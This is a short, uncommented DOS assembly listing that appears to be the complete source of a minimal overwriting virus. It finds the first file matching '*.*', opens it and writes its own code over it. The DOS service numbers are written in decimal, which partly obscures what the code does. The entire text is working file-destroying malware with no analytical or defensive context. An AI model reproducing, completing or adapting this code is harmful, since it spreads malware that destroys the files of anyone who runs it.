Lea Dx,Fs
Mov Ah,78
Int 33
Mov Dx,9eh
Mov Ah,61
o1: Int 33
Xchg Ax,Bx
Mov Dl,27
FS Db '*.*',0
Xchg Cx,Dx
Mov Ah,64
Jmp o1
